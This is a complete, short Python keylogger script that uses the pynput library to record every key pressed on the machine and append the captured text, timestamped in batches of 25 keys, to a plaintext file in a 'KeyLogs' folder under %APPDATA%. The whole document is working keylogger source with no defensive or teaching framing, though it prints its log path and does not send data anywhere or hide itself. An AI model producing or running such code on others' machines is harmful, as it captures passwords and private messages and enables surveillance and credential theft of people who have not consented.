from pynput import keyboard
import os
from datetime import datetime

# Create a directory for logs in %APPDATA%
LOG_DIR = os.path.join(os.getenv("APPDATA"), "KeyLogs")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "keystrokes.log")

keystrokes = []

# Write captured keystrokes to a plaintext log file
def write_log():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {''.join(keystrokes)}\n"
    with open(LOG_FILE, "a", encoding='utf-8') as f:
        f.write(log_entry)

# Key press event handler
def on_press(key):
    try:
        keystrokes.append(key.char)
    except AttributeError:
        if key == key.space:
            keystrokes.append(' ')
        else:
            keystrokes.append(f'[{key.name}]')

    if len(keystrokes) >= 25:
        write_log()
        keystrokes.clear()

# Start listening for keypresses
def start_logger():
    print(f"[+] Logging to: {LOG_FILE}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_logger()
